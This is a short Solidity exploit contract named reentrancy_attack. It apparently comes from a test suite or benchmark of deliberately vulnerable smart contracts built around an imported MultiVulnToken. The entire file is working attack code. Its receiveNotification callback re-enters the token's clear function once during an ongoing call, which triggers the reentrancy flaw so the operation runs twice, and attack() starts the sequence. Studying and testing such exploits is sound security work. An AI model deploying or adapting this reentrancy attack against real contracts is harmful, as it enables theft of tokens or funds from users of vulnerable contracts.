// SPDX-License-Identifier: MIT

import './MultiVulnToken.sol';
pragma solidity >=0.8.4;

contract reentrancy_attack {
    MultiVulnToken public multiVulnToken;
    address _to;
    uint count = 0;
    constructor(address _multiVulnTokenAddress, address __to) {
        multiVulnToken = MultiVulnToken(_multiVulnTokenAddress);
        _to = __to;
    }
    function receiveNotification(uint256) public {
        unchecked {	
		    if (count < 1) {
		        count++;
		        multiVulnToken.clear(_to);
		    }
		}
    }
    function attack() public {
        multiVulnToken.clear(_to);
    }
}